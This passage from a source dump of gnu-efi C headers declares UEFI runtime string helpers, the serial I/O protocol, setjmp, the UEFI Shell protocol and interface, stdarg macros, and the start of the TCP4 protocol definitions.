    IN CHAR16   *Dest,
    IN CONST CHAR16    *Src,
    IN UINTN     Len
    );

VOID
RUNTIMEFUNCTION
RtStrCat (
    IN CHAR16   *Dest,
    IN CONST CHAR16   *Src
    );

VOID
RUNTIMEFUNCTION
RtStrnCat (
    IN CHAR16   *Dest,
    IN CONST CHAR16   *Src,
    IN UINTN     Len
    );

UINTN
RUNTIMEFUNCTION
RtStrLen (
    IN CONST CHAR16   *s1
    );

UINTN
RUNTIMEFUNCTION
RtStrnLen (
    IN CONST CHAR16   *s1,
    IN UINTN           Len
    );

UINTN
RUNTIMEFUNCTION
RtStrSize (
    IN CONST CHAR16   *s1
    );

INTN
RUNTIMEFUNCTION
RtCompareGuid (
    IN EFI_GUID     *Guid1,
    IN EFI_GUID     *Guid2
    );

UINT8
RUNTIMEFUNCTION
RtDecimaltoBCD(
    IN  UINT8 BcdValue
    );

UINT8
RUNTIMEFUNCTION
RtBCDtoDecimal(
    IN  UINT8 BcdValue
    );

//
// Virtual mapping transition support.  (Only used during
// the virtual address change transisition)
//

VOID
RUNTIMEFUNCTION
RtLibEnableVirtualMappings (
    VOID
    );

VOID
RUNTIMEFUNCTION
RtConvertList (
    IN UINTN            DebugDisposition,
    IN OUT LIST_ENTRY   *ListHead
    );

VOID
RUNTIMEFUNCTION
RtAcquireLock (
    IN FLOCK    *Lock
    );

VOID
RUNTIMEFUNCTION
RtReleaseLock (
    IN FLOCK    *Lock
    );


#endif

```

`include/gnu-efi/efiser.h`:

```h
#ifndef _EFI_SER_H
#define _EFI_SER_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efiser.h

Abstract:

    EFI serial protocol

Revision History

--*/

//
// Serial protocol
//

#define EFI_SERIAL_IO_PROTOCOL_GUID \
    { 0xBB25CF6F, 0xF1D4, 0x11D2, {0x9A, 0x0C, 0x00, 0x90, 0x27, 0x3F, 0xC1, 0xFD} }
#define SERIAL_IO_PROTOCOL EFI_SERIAL_IO_PROTOCOL_GUID

INTERFACE_DECL(_EFI_SERIAL_IO_PROTOCOL);

typedef enum {
    DefaultParity,
    NoParity,
    EvenParity,
    OddParity,
    MarkParity,
    SpaceParity
} EFI_PARITY_TYPE;

typedef enum {
    DefaultStopBits,
    OneStopBit,         // 1 stop bit
    OneFiveStopBits,    // 1.5 stop bits
    TwoStopBits         // 2 stop bits
} EFI_STOP_BITS_TYPE;

#define EFI_SERIAL_CLEAR_TO_SEND                   0x0010  // RO
#define EFI_SERIAL_DATA_SET_READY                  0x0020  // RO
#define EFI_SERIAL_RING_INDICATE                   0x0040  // RO
#define EFI_SERIAL_CARRIER_DETECT                  0x0080  // RO
#define EFI_SERIAL_REQUEST_TO_SEND                 0x0002  // WO
#define EFI_SERIAL_DATA_TERMINAL_READY             0x0001  // WO
#define EFI_SERIAL_INPUT_BUFFER_EMPTY              0x0100  // RO
#define EFI_SERIAL_OUTPUT_BUFFER_EMPTY             0x0200  // RO
#define EFI_SERIAL_HARDWARE_LOOPBACK_ENABLE        0x1000  // RW
#define EFI_SERIAL_SOFTWARE_LOOPBACK_ENABLE        0x2000  // RW
#define EFI_SERIAL_HARDWARE_FLOW_CONTROL_ENABLE    0x4000  // RW

typedef
EFI_STATUS
(EFIAPI *EFI_SERIAL_RESET) (
    IN struct _EFI_SERIAL_IO_PROTOCOL  *This
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SERIAL_SET_ATTRIBUTES) (
    IN struct _EFI_SERIAL_IO_PROTOCOL  *This,
    IN UINT64                          BaudRate,
    IN UINT32                          ReceiveFifoDepth,
    IN UINT32                          Timeout,
    IN EFI_PARITY_TYPE                 Parity,
    IN UINT8                           DataBits,
    IN EFI_STOP_BITS_TYPE              StopBits
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SERIAL_SET_CONTROL_BITS) (
    IN struct _EFI_SERIAL_IO_PROTOCOL  *This,
    IN UINT32                          Control
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SERIAL_GET_CONTROL_BITS) (
    IN struct _EFI_SERIAL_IO_PROTOCOL  *This,
    OUT UINT32                         *Control
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SERIAL_WRITE) (
    IN struct _EFI_SERIAL_IO_PROTOCOL  *This,
    IN OUT UINTN                       *BufferSize,
    IN VOID                            *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SERIAL_READ) (
    IN struct _EFI_SERIAL_IO_PROTOCOL  *This,
    IN OUT UINTN                       *BufferSize,
    OUT VOID                           *Buffer
    );

typedef struct {
    UINT32                  ControlMask;

    // current Attributes
    UINT32                  Timeout;
    UINT64                  BaudRate;
    UINT32                  ReceiveFifoDepth;
    UINT32                  DataBits;
    UINT32                  Parity;
    UINT32                  StopBits;
} SERIAL_IO_MODE;

#define SERIAL_IO_INTERFACE_REVISION    0x00010000

typedef struct _EFI_SERIAL_IO_PROTOCOL {
    UINT32                       Revision;
    EFI_SERIAL_RESET             Reset;
    EFI_SERIAL_SET_ATTRIBUTES    SetAttributes;
    EFI_SERIAL_SET_CONTROL_BITS  SetControl;
    EFI_SERIAL_GET_CONTROL_BITS  GetControl;
    EFI_SERIAL_WRITE             Write;
    EFI_SERIAL_READ              Read;

    SERIAL_IO_MODE               *Mode;
} EFI_SERIAL_IO_PROTOCOL;

typedef struct _EFI_SERIAL_IO_PROTOCOL _SERIAL_IO_INTERFACE;
typedef EFI_SERIAL_IO_PROTOCOL SERIAL_IO_INTERFACE;

#endif


```

`include/gnu-efi/efisetjmp.h`:

```h
#ifndef GNU_EFI_SETJMP_H
#define GNU_EFI_SETJMP_H

#include "eficompiler.h"
#include "efisetjmp_arch.h"

extern UINTN setjmp(jmp_buf env) __attribute__((returns_twice));
extern VOID longjmp(jmp_buf env, UINTN value) __attribute__((noreturn));

#endif /* GNU_EFI_SETJMP_H */

```

`include/gnu-efi/efishell.h`:

```h
/**
  EFI Shell protocol as defined in the UEFI Shell Specification 2.2.

  (C) Copyright 2014 Hewlett-Packard Development Company, L.P.<BR>
  Copyright (c) 2006 - 2018, Intel Corporation. All rights reserved.<BR>
  SPDX-License-Identifier: BSD-2-Clause-Patent

  This file is based on MdePkg/Include/Protocol/Shell.h from EDK2
  Ported to gnu-efi by Jiaqing Zhao <jiaqing.zhao@intel.com>
**/

#ifndef _EFI_SHELL_H
#define _EFI_SHELL_H

#include "efilink.h"

#define EFI_SHELL_PROTOCOL_GUID \
    { 0x6302d008, 0x7f9b, 0x4f30, { 0x87, 0xac, 0x60, 0xc9, 0xfe, 0xf5, 0xda, 0x4e } }

INTERFACE_DECL(_EFI_SHELL_PROTOCOL);

typedef enum {
    SHELL_SUCCESS              = 0,
    SHELL_LOAD_ERROR           = 1,
    SHELL_INVALID_PARAMETER    = 2,
    SHELL_UNSUPPORTED          = 3,
    SHELL_BAD_BUFFER_SIZE      = 4,
    SHELL_BUFFER_TOO_SMALL     = 5,
    SHELL_NOT_READY            = 6,
    SHELL_DEVICE_ERROR         = 7,
    SHELL_WRITE_PROTECTED      = 8,
    SHELL_OUT_OF_RESOURCES     = 9,
    SHELL_VOLUME_CORRUPTED     = 10,
    SHELL_VOLUME_FULL          = 11,
    SHELL_NO_MEDIA             = 12,
    SHELL_MEDIA_CHANGED        = 13,
    SHELL_NOT_FOUND            = 14,
    SHELL_ACCESS_DENIED        = 15,
    SHELL_TIMEOUT              = 18,
    SHELL_NOT_STARTED          = 19,
    SHELL_ALREADY_STARTED      = 20,
    SHELL_ABORTED              = 21,
    SHELL_INCOMPATIBLE_VERSION = 25,
    SHELL_SECURITY_VIOLATION   = 26,
    SHELL_NOT_EQUAL            = 27
} SHELL_STATUS;

typedef VOID *SHELL_FILE_HANDLE;

typedef struct {
    EFI_LIST_ENTRY    Link;
    EFI_STATUS        Status;
    CONST CHAR16      *FullName;
    CONST CHAR16      *FileName;
    SHELL_FILE_HANDLE Handle;
    EFI_FILE_INFO     *Info;
} EFI_SHELL_FILE_INFO;

typedef
BOOLEAN
(EFIAPI *EFI_SHELL_BATCH_IS_ACTIVE) (
    VOID
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_CLOSE_FILE) (
    IN SHELL_FILE_HANDLE FileHandle
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_CREATE_FILE) (
    IN CONST CHAR16       *FileName,
    IN UINT64             FileAttribs,
    OUT SHELL_FILE_HANDLE *FileHandle
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_DELETE_FILE) (
    IN SHELL_FILE_HANDLE FileHandle
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_DELETE_FILE_BY_NAME) (
    IN CONST CHAR16 *FileName
    );

typedef
VOID
(EFIAPI *EFI_SHELL_DISABLE_PAGE_BREAK) (
    VOID
    );

typedef
VOID
(EFIAPI *EFI_SHELL_ENABLE_PAGE_BREAK) (
    VOID
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_EXECUTE) (
    IN EFI_HANDLE  *ParentImageHandle,
    IN CHAR16      *CommandLine OPTIONAL,
    IN CHAR16      **Environment OPTIONAL,
    OUT EFI_STATUS *StatusCode OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_FIND_FILES) (
    IN CONST CHAR16         *FilePattern,
    OUT EFI_SHELL_FILE_INFO **FileList
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_FIND_FILES_IN_DIR) (
    IN SHELL_FILE_HANDLE    FileDirHandle,
    OUT EFI_SHELL_FILE_INFO **FileList
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_FLUSH_FILE) (
    IN SHELL_FILE_HANDLE FileHandle
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_FREE_FILE_LIST) (
    IN EFI_SHELL_FILE_INFO **FileList
    );

typedef
CONST CHAR16 *
(EFIAPI *EFI_SHELL_GET_ALIAS) (
  IN  CONST CHAR16 *Alias,
  OUT BOOLEAN      *Volatile OPTIONAL
  );

typedef
CONST CHAR16 *
(EFIAPI *EFI_SHELL_GET_CUR_DIR) (
  IN CONST CHAR16 *FileSystemMapping OPTIONAL
  );

typedef UINT32 EFI_SHELL_DEVICE_NAME_FLAGS;
#define EFI_DEVICE_NAME_USE_COMPONENT_NAME 0x00000001
#define EFI_DEVICE_NAME_USE_DEVICE_PATH    0x00000002

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_GET_DEVICE_NAME) (
    IN EFI_HANDLE                   DeviceHandle,
    IN EFI_SHELL_DEVICE_NAME_FLAGS  Flags,
    IN CHAR8                        *Language,
    OUT CHAR16                      **BestDeviceName
    );

typedef
CONST EFI_DEVICE_PATH_PROTOCOL *
(EFIAPI *EFI_SHELL_GET_DEVICE_PATH_FROM_MAP) (
    IN CONST CHAR16 *Mapping
    );

typedef
EFI_DEVICE_PATH_PROTOCOL *
(EFIAPI *EFI_SHELL_GET_DEVICE_PATH_FROM_FILE_PATH) (
    IN CONST CHAR16 *Path
    );

typedef
CONST CHAR16 *
(EFIAPI *EFI_SHELL_GET_ENV) (
    IN CONST CHAR16 *Name
    );

typedef
CONST CHAR16 *
(EFIAPI *EFI_SHELL_GET_ENV_EX) (
    IN CONST CHAR16 *Name,
    OUT UINT32      *Attributes OPTIONAL
    );

typedef
EFI_FILE_INFO *
(EFIAPI *EFI_SHELL_GET_FILE_INFO) (
    IN SHELL_FILE_HANDLE FileHandle
    );

typedef
CHAR16 *
(EFIAPI *EFI_SHELL_GET_FILE_PATH_FROM_DEVICE_PATH) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL *Path
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_GET_FILE_POSITION) (
    IN SHELL_FILE_HANDLE FileHandle,
    OUT UINT64           *Position
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_GET_FILE_SIZE) (
    IN SHELL_FILE_HANDLE FileHandle,
    OUT UINT64           *Size
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_GET_GUID_FROM_NAME) (
    IN CONST CHAR16 *GuidName,
    OUT EFI_GUID    *Guid
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_GET_GUID_NAME)(
    IN CONST EFI_GUID *Guid,
    OUT CONST CHAR16  **GuidName
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_GET_HELP_TEXT) (
    IN CONST CHAR16 *Command,
    IN CONST CHAR16 *Sections,
    OUT CHAR16      **HelpText
    );

typedef
CONST CHAR16 *
(EFIAPI *EFI_SHELL_GET_MAP_FROM_DEVICE_PATH) (
    IN OUT EFI_DEVICE_PATH_PROTOCOL **DevicePath
    );

typedef
BOOLEAN
(EFIAPI *EFI_SHELL_GET_PAGE_BREAK) (
    VOID
    );

typedef
BOOLEAN
(EFIAPI *EFI_SHELL_IS_ROOT_SHELL) (
    VOID
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_OPEN_FILE_BY_NAME) (
    IN CONST CHAR16       *FileName,
    OUT SHELL_FILE_HANDLE *FileHandle,
    IN UINT64             OpenMode
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_OPEN_FILE_LIST) (
    IN CHAR16                  *Path,
    IN UINT64                  OpenMode,
    IN OUT EFI_SHELL_FILE_INFO **FileList
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_OPEN_ROOT) (
    IN EFI_DEVICE_PATH_PROTOCOL *DevicePath,
    OUT SHELL_FILE_HANDLE       *FileHandle
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_OPEN_ROOT_BY_HANDLE) (
    IN EFI_HANDLE         DeviceHandle,
    OUT SHELL_FILE_HANDLE *FileHandle
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_READ_FILE) (
    IN SHELL_FILE_HANDLE FileHandle,
    IN OUT UINTN         *ReadSize,
    IN OUT VOID          *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_REGISTER_GUID_NAME) (
    IN CONST EFI_GUID *Guid,
    IN CONST CHAR16   *GuidName
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_REMOVE_DUP_IN_FILE_LIST) (
    IN EFI_SHELL_FILE_INFO **FileList
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_SET_ALIAS) (
    IN CONST CHAR16 *Command,
    IN CONST CHAR16 *Alias,
    IN BOOLEAN      Replace,
    IN BOOLEAN      Volatile
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_SET_CUR_DIR) (
    IN CONST CHAR16 *FileSystem OPTIONAL,
    IN CONST CHAR16 *Dir
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_SET_ENV) (
    IN CONST CHAR16 *Name,
    IN CONST CHAR16 *Value,
    IN BOOLEAN      Volatile
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_SET_FILE_INFO) (
    IN SHELL_FILE_HANDLE   FileHandle,
    IN CONST EFI_FILE_INFO *FileInfo
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_SET_FILE_POSITION) (
    IN SHELL_FILE_HANDLE FileHandle,
    IN UINT64            Position
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_SET_MAP) (
    IN CONST EFI_DEVICE_PATH_PROTOCOL *DevicePath,
    IN CONST CHAR16                   *Mapping
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SHELL_WRITE_FILE) (
    IN SHELL_FILE_HANDLE FileHandle,
    IN OUT UINTN         *BufferSize,
    IN VOID              *Buffer
    );

typedef struct _EFI_SHELL_PROTOCOL {
    EFI_SHELL_EXECUTE                         Execute;
    EFI_SHELL_GET_ENV                         GetEnv;
    EFI_SHELL_SET_ENV                         SetEnv;
    EFI_SHELL_GET_ALIAS                       GetAlias;
    EFI_SHELL_SET_ALIAS                       SetAlias;
    EFI_SHELL_GET_HELP_TEXT                   GetHelpText;
    EFI_SHELL_GET_DEVICE_PATH_FROM_MAP        GetDevicePathFromMap;
    EFI_SHELL_GET_MAP_FROM_DEVICE_PATH        GetMapFromDevicePath;
    EFI_SHELL_GET_DEVICE_PATH_FROM_FILE_PATH  GetDevicePathFromFilePath;
    EFI_SHELL_GET_FILE_PATH_FROM_DEVICE_PATH  GetFilePathFromDevicePath;
    EFI_SHELL_SET_MAP                         SetMap;
    EFI_SHELL_GET_CUR_DIR                     GetCurDir;
    EFI_SHELL_SET_CUR_DIR                     SetCurDir;
    EFI_SHELL_OPEN_FILE_LIST                  OpenFileList;
    EFI_SHELL_FREE_FILE_LIST                  FreeFileList;
    EFI_SHELL_REMOVE_DUP_IN_FILE_LIST         RemoveDupInFileList;
    EFI_SHELL_BATCH_IS_ACTIVE                 BatchIsActive;
    EFI_SHELL_IS_ROOT_SHELL                   IsRootShell;
    EFI_SHELL_ENABLE_PAGE_BREAK               EnablePageBreak;
    EFI_SHELL_DISABLE_PAGE_BREAK              DisablePageBreak;
    EFI_SHELL_GET_PAGE_BREAK                  GetPageBreak;
    EFI_SHELL_GET_DEVICE_NAME                 GetDeviceName;
    EFI_SHELL_GET_FILE_INFO                   GetFileInfo;
    EFI_SHELL_SET_FILE_INFO                   SetFileInfo;
    EFI_SHELL_OPEN_FILE_BY_NAME               OpenFileByName;
    EFI_SHELL_CLOSE_FILE                      CloseFile;
    EFI_SHELL_CREATE_FILE                     CreateFile;
    EFI_SHELL_READ_FILE                       ReadFile;
    EFI_SHELL_WRITE_FILE                      WriteFile;
    EFI_SHELL_DELETE_FILE                     DeleteFile;
    EFI_SHELL_DELETE_FILE_BY_NAME             DeleteFileByName;
    EFI_SHELL_GET_FILE_POSITION               GetFilePosition;
    EFI_SHELL_SET_FILE_POSITION               SetFilePosition;
    EFI_SHELL_FLUSH_FILE                      FlushFile;
    EFI_SHELL_FIND_FILES                      FindFiles;
    EFI_SHELL_FIND_FILES_IN_DIR               FindFilesInDir;
    EFI_SHELL_GET_FILE_SIZE                   GetFileSize;
    EFI_SHELL_OPEN_ROOT                       OpenRoot;
    EFI_SHELL_OPEN_ROOT_BY_HANDLE             OpenRootByHandle;
    EFI_EVENT                                 ExecutionBreak;
    UINT32                                    MajorVersion;
    UINT32                                    MinorVersion;
    // Added for Shell 2.1
    EFI_SHELL_REGISTER_GUID_NAME              RegisterGuidName;
    EFI_SHELL_GET_GUID_NAME                   GetGuidName;
    EFI_SHELL_GET_GUID_FROM_NAME              GetGuidFromName;
    EFI_SHELL_GET_ENV_EX                      GetEnvEx;
} EFI_SHELL_PROTOCOL;

#define EFI_SHELL_PARAMETERS_PROTOCOL_GUID \
    { 0x752f3136, 0x4e16, 0x4fdc, { 0xa2, 0x2a, 0xe5, 0xf4, 0x68, 0x12, 0xf4, 0xca } }

INTERFACE_DECL(_EFI_SHELL_PARAMETERS_PROTOCOL);

typedef struct _EFI_SHELL_PARAMETERS_PROTOCOL {
    CHAR16            **Argv;
    UINTN             Argc;
    SHELL_FILE_HANDLE StdIn;
    SHELL_FILE_HANDLE StdOut;
    SHELL_FILE_HANDLE StdErr;
} EFI_SHELL_PARAMETERS_PROTOCOL;

#define EFI_SHELL_DYNAMIC_COMMAND_PROTOCOL_GUID \
    { 0x3c7200e9, 0x005f, 0x4ea4, { 0x87, 0xde, 0xa3, 0xdf, 0xac, 0x8a, 0x27, 0xc3 } }

INTERFACE_DECL(_EFI_SHELL_DYNAMIC_COMMAND_PROTOCOL);

typedef
SHELL_STATUS
(EFIAPI *SHELL_COMMAND_HANDLER)(
    IN struct _EFI_SHELL_DYNAMIC_COMMAND_PROTOCOL *This,
    IN EFI_SYSTEM_TABLE                           *SystemTable,
    IN EFI_SHELL_PARAMETERS_PROTOCOL              *ShellParameters,
    IN EFI_SHELL_PROTOCOL                         *Shell
    );

typedef
CHAR16*
(EFIAPI *SHELL_COMMAND_GETHELP)(
    IN struct _EFI_SHELL_DYNAMIC_COMMAND_PROTOCOL *This,
    IN CONST CHAR8                                *Language
    );

typedef struct _EFI_SHELL_DYNAMIC_COMMAND_PROTOCOL {
    CONST CHAR16          *CommandName;
    SHELL_COMMAND_HANDLER Handler;
    SHELL_COMMAND_GETHELP GetHelp;
} EFI_SHELL_DYNAMIC_COMMAND_PROTOCOL;

#endif

```

`include/gnu-efi/efishellintf.h`:

```h
/** @file
  SHELL_INTERFACE_PROTOCOL from EDK shell (no spec).

  Shell Interface - additional information (over image_info) provided
  to an application started by the shell.

  ConIo provides a file-style interface to the console.

  The shell interface's and data (including ConIo) are only valid during
  the applications Entry Point.  Once the application returns from it's
  entry point the data is freed by the invoking shell.

  Copyright (c) 2006 - 2010, Intel Corporation. All rights reserved.<BR>
  This program and the accompanying materials
  are licensed and made available under the terms and conditions of the BSD License
  which accompanies this distribution.  The full text of the license may be found at
  http://opensource.org/licenses/bsd-license.php

  THE PROGRAM IS DISTRIBUTED UNDER THE BSD LICENSE ON AN "AS IS" BASIS,
  WITHOUT WARRANTIES OR REPRESENTATIONS OF ANY KIND, EITHER EXPRESS OR IMPLIED.

**/
/*
 * This is based on ShellPkg/Include/Protocol/EfiShellInterface.h from EDK II.
 */

#ifndef _SHELLINTERFACE_H_
#define _SHELLINTERFACE_H_


#define SHELL_INTERFACE_PROTOCOL_GUID \
  { \
    0x47c7b223, 0xc42a, 0x11d2, {0x8e, 0x57, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} \
  }

///
/// Bit definitions for EFI_SHELL_ARG_INFO
///
typedef enum {
  ARG_NO_ATTRIB         = 0x0,
  ARG_IS_QUOTED         = 1<<0,
  ARG_PARTIALLY_QUOTED  = 1<<1,
  ARG_FIRST_HALF_QUOTED = 1<<2,
  ARG_FIRST_CHAR_IS_ESC = 1<<3
} EFI_SHELL_ARG_INFO_TYPES;

///
/// Attributes for an argument.
///
typedef struct _EFI_SHELL_ARG_INFO {
  UINT32  Attributes;
} EFI_SHELL_ARG_INFO;

///
/// This protocol provides access to additional information about a shell application.
///
typedef struct {
  ///
  /// Handle back to original image handle & image information.
  ///
  EFI_HANDLE                ImageHandle;
  EFI_LOADED_IMAGE *Info;

  ///
  /// Parsed arg list converted more C-like format.
  ///
  CHAR16                    **Argv;
  UINTN                     Argc;

  ///
  /// Storage for file redirection args after parsing.
  ///
  CHAR16                    **RedirArgv;
  UINTN                     RedirArgc;

  ///
  /// A file style handle for console io.
  ///
  EFI_FILE         *StdIn;
  EFI_FILE         *StdOut;
  EFI_FILE         *StdErr;

  ///
  /// List of attributes for each argument.
  ///
  EFI_SHELL_ARG_INFO        *ArgInfo;

  ///
  /// Whether we are echoing.
  ///
  BOOLEAN                   EchoOn;
} EFI_SHELL_INTERFACE;

#endif

```

`include/gnu-efi/efistdarg.h`:

```h
#ifndef _EFISTDARG_H_
#define _EFISTDARG_H_

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    devpath.h

Abstract:

    Defines for parsing the EFI Device Path structures



Revision History

--*/

#if !defined(GNU_EFI_USE_EXTERNAL_STDARG) && !defined(_MSC_VER)
typedef __builtin_va_list va_list;

# define va_start(v,l)	__builtin_va_start(v,l)
# define va_end(v)	__builtin_va_end(v)
# define va_arg(v,l)	__builtin_va_arg(v,l)
# define va_copy(d,s)	__builtin_va_copy(d,s)
#else
# include <stdarg.h>
#endif

#endif

```

`include/gnu-efi/efitcp.h`:

```h
#ifndef _EFI_TCP_H
#define _EFI_TCP_H

/*++
Copyright (c) 2013  Intel Corporation

--*/

#define EFI_TCP4_SERVICE_BINDING_PROTOCOL \
    { 0x00720665, 0x67eb, 0x4a99, {0xba, 0xf7, 0xd3, 0xc3, 0x3a, 0x1c,0x7c, 0xc9}}

#define EFI_TCP4_PROTOCOL \
    { 0x65530bc7, 0xa359, 0x410f, {0xb0, 0x10, 0x5a, 0xad, 0xc7, 0xec, 0x2b, 0x62}}

#define EFI_TCP6_SERVICE_BINDING_PROTOCOL \
    { 0xec20eb79, 0x6c1a, 0x4664, {0x9a, 0xd, 0xd2, 0xe4, 0xcc, 0x16, 0xd6, 0x64}}

#define EFI_TCP6_PROTOCOL \
    { 0x46e44855, 0xbd60, 0x4ab7, {0xab, 0xd, 0xa6, 0x79, 0xb9, 0x44, 0x7d, 0x77}}

INTERFACE_DECL(_EFI_TCP4);
INTERFACE_DECL(_EFI_TCP6);

typedef struct {
    BOOLEAN            UseDefaultAddress;
    EFI_IPv4_ADDRESS   StationAddress;
    EFI_IPv4_ADDRESS   SubnetMask;
    UINT16             StationPort;
    EFI_IPv4_ADDRESS   RemoteAddress;
    UINT16             RemotePort;
    BOOLEAN            ActiveFlag;
} EFI_TCP4_ACCESS_POINT;

typedef struct {
    UINT32             ReceiveBufferSize;
    UINT32             SendBufferSize;
    UINT32             MaxSynBackLog;
    UINT32             ConnectionTimeout;
    UINT32             DataRetries;
    UINT32             FinTimeout;
    UINT32             TimeWaitTimeout;
    UINT32             KeepAliveProbes;
    UINT32             KeepAliveTime;
    UINT32             KeepAliveInterval;
    BOOLEAN            EnableNagle;
    BOOLEAN            EnableTimeStamp;
    BOOLEAN            EnableWindowScaling;
    BOOLEAN            EnableSelectiveAck;
    BOOLEAN            EnablePAthMtuDiscovery;
} EFI_TCP4_OPTION;

typedef struct {
    // Receiving Filters
    // I/O parameters
    UINT8                 TypeOfService;
    UINT8                 TimeToLive;

    // Access Point
    EFI_TCP4_ACCESS_POINT AccessPoint;

    // TCP Control Options
    EFI_TCP4_OPTION       *ControlOption;
} EFI_TCP4_CONFIG_DATA;

typedef enum {
    Tcp4StateClosed      = 0,
    Tcp4StateListen      = 1,
    Tcp4StateSynSent     = 2,
    Tcp4StateSynReceived = 3,
    Tcp4StateEstablished = 4,
    Tcp4StateFinWait1    = 5,
    Tcp4StateFinWait2    = 6,
    Tcp4StateClosing     = 7,
    Tcp4StateTimeWait    = 8,
    Tcp4StateCloseWait   = 9,
    Tcp4StateLastAck     = 10
} EFI_TCP4_CONNECTION_STATE;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_GET_MODE_DATA) (
    IN struct _EFI_TCP4                 *This,
    OUT EFI_TCP4_CONNECTION_STATE       *Tcp4State      OPTIONAL,
    OUT EFI_TCP4_CONFIG_DATA            *Tcp4ConfigData OPTIONAL,
    OUT EFI_IP4_MODE_DATA               *Ip4ModeData    OPTIONAL,
    OUT EFI_MANAGED_NETWORK_CONFIG_DATA *MnpConfigData  OPTIONAL,
    OUT EFI_SIMPLE_NETWORK_MODE         *SnpModeData    OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_CONFIGURE) (
    IN struct _EFI_TCP4     *This,
    IN EFI_TCP4_CONFIG_DATA *TcpConfigData OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_ROUTES) (
    IN struct _EFI_TCP4 *This,
    IN BOOLEAN          DeleteRoute,
    IN EFI_IPv4_ADDRESS *SubnetAddress,
    IN EFI_IPv4_ADDRESS *SubnetMask,
    IN EFI_IPv4_ADDRESS *GatewayAddress
);

typedef struct {
    EFI_EVENT  Event;
    EFI_STATUS Status;
} EFI_TCP4_COMPLETION_TOKEN;

typedef struct {
    EFI_TCP4_COMPLETION_TOKEN CompletionToken;
} EFI_TCP4_CONNECTION_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_CONNECT) (
    IN struct _EFI_TCP4          *This,
    IN EFI_TCP4_CONNECTION_TOKEN *ConnectionToken
    );

typedef struct {
    EFI_TCP4_COMPLETION_TOKEN CompletionToken;
    EFI_HANDLE                NewChildHandle;
} EFI_TCP4_LISTEN_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_ACCEPT) (
    IN struct _EFI_TCP4      *This,
    IN EFI_TCP4_LISTEN_TOKEN *ListenToken
    );

#define EFI_CONNECTION_FIN     EFIERR(104)
#define EFI_CONNECTION_RESET   EFIERR(105)
#define EFI_CONNECTION_REFUSED EFIERR(106)

typedef struct {
    UINT32 FragmentLength;
    VOID   *FragmentBuffer;
} EFI_TCP4_FRAGMENT_DATA;

typedef struct {
    BOOLEAN                UrgentFlag;
    UINT32                 DataLength;
    UINT32                 FragmentCount;
    EFI_TCP4_FRAGMENT_DATA FragmentTable[1];
} EFI_TCP4_RECEIVE_DATA;

typedef struct {
    BOOLEAN                Push;
    BOOLEAN                Urgent;
    UINT32                 DataLength;
    UINT32                 FragmentCount;
    EFI_TCP4_FRAGMENT_DATA FragmentTable[1];
} EFI_TCP4_TRANSMIT_DATA;

typedef struct {
    EFI_TCP4_COMPLETION_TOKEN  CompletionToken;
    union {
	EFI_TCP4_RECEIVE_DATA  *RxData;
	EFI_TCP4_TRANSMIT_DATA *TxData;
    }                          Packet;
} EFI_TCP4_IO_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_TRANSMIT) (
    IN struct _EFI_TCP4  *This,
    IN EFI_TCP4_IO_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_RECEIVE) (
    IN struct _EFI_TCP4  *This,
    IN EFI_TCP4_IO_TOKEN *Token
    );

typedef struct {
    EFI_TCP4_COMPLETION_TOKEN CompletionToken;
    BOOLEAN                   AbortOnClose;
} EFI_TCP4_CLOSE_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_CLOSE)(
    IN struct _EFI_TCP4     *This,
    IN EFI_TCP4_CLOSE_TOKEN *CloseToken
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_CANCEL)(
    IN struct _EFI_TCP4 *This,
    IN EFI_TCP4_COMPLETION_TOKEN *Token OPTIONAL
);

typedef
EFI_STATUS
(EFIAPI *EFI_TCP4_POLL) (
    IN struct _EFI_TCP4 *This
    );

typedef struct _EFI_TCP4 {
    EFI_TCP4_GET_MODE_DATA GetModeData;
